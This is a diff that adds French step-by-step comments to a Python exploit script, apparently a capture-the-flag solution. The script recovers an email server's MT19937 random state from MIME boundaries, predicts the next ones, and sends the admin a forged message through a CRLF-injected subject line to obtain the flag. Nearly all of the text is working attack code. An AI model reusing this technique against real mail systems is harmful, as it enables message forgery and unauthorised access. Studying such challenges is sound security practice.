@@ -28,6 +28,12 @@ HOST, PORT = u.hostname, u.port or 80
 conn = http.client.HTTPConnection(HOST, PORT, timeout=60)
 
 
+# --------------------------------------------------------------------------
+# Etape 0 : client HTTP keep-alive
+#   une seule connexion TCP pour tout le run (le serveur garde un etat par
+#   connexion), avec recréation automatique en cas de coupure
+# --------------------------------------------------------------------------
+
 def req(method, path, obj=None, token=None):
     global conn
     last = None
@@ -54,16 +60,33 @@ def req(method, path, obj=None, token=None):
     raise last
 
 
+# --------------------------------------------------------------------------
+# Etape 1/6 : acces initial
+#   GET /api/password ne repond qu'une fois par instance, puis POST
+#   /api/login donne le token de user@ses (on le garde dans le JSON local)
+# --------------------------------------------------------------------------
+
 pw = req('GET', '/api/password')
 tok = req('POST', '/api/login', {'username': 'user@ses', 'password': pw})
 json.dump({'base': BASE, 'pw': pw, 'tok': tok}, open(r'./_z_496_remote.json', 'w'))
 print('[i] pw', pw, 'me', req('GET', '/api/me', None, tok), flush=True)
+
+# --------------------------------------------------------------------------
+# Etape 2/6 : warmup
+#   on s'envoie N mails a soi-meme : chaque envoi consomme un tirage du MT19937
+#   du serveur, et la boundary MIME du mail EST ce tirage
+# --------------------------------------------------------------------------
 
 ids = []
 t0 = time.time()
 for i in range(WARM):
     ids.append(req('POST', '/api/send', {'to': 'user@ses', 'subject': 'q%d' % i, 'body': 'b'}, tok))
 print('[i] warmup %d in %.1fs' % (len(ids), time.time() - t0), flush=True)
+# --------------------------------------------------------------------------
+# Etape 6/6 : recolte
+#   on boucle sur la boite : le mail de reponse du bot contient le flag
+# --------------------------------------------------------------------------
+
 emails = req('GET', '/api/emails', None, tok)
 rows = []
 for eid in ids:
@@ -77,12 +100,24 @@ print('[i] rows %d dup %d' % (len(rows), len(rows) - len(set(t for t, _ in rows)
 json.dump([b for _, b in rows], open(r'./_z_496_bounds.json', 'w'))
 
 t0 = time.time()
+# --------------------------------------------------------------------------
+# Etape 3/6 : crack du MT19937
+#   crack2.py untemper les valeurs, puis z3 resout l'etat sur deux
+#   twists ; on en deduit les prochains tirages (pred.json)
+# --------------------------------------------------------------------------
+
 r = subprocess.run(['wsl', '-d', 'kali-linux', '--', 'python3', './_z_496_crack2.py'],
                    capture_output=True, text=True)
 print('[i] crack rc=%d %.1fs' % (r.returncode, time.time() - t0), r.stdout.strip().splitlines()[-1][:200])
 if r.returncode != 0:
     print(r.stderr[-600:]); sys.exit(1)
 preds = json.load(open(r'./_z_496_pred.json'))
+
+# --------------------------------------------------------------------------
+# Etape 4/6 : sonde de recalage
+#   sa boundary nous dit ou l'on se trouve dans la sequence predite
+#   (les mails signes consomment deux tirages, pas un)
+# --------------------------------------------------------------------------
 
 pid = req('POST', '/api/send', {'to': 'user@ses', 'subject': 'align', 'body': 'b'}, tok)
 em = req('GET', '/api/email/' + pid, None, tok)
@@ -97,6 +132,12 @@ B1 = '=' * 15 + ('%019d' % preds[NEXT + 1]) + '=='
 B2 = '=' * 15 + ('%019d' % preds[NEXT + 2]) + '=='
 print('[i] B1 =', B1)
 print('[i] B2 =', B2)
+# --------------------------------------------------------------------------
+# Etape 5/6 : mail piege
+#   Subject avec CRLF injecte, corps au bon format, et une boundary
+#   interne qui reutilise un tirage deja connu du serveur
+# --------------------------------------------------------------------------
+
 eid = req('POST', '/api/send', {'to': 'admin@ses', 'subject': make_subj(B1, B2, 'admin@ses'), 'body': 'hello'}, tok)
 print('[i] exploit mail', eid, flush=True)
 
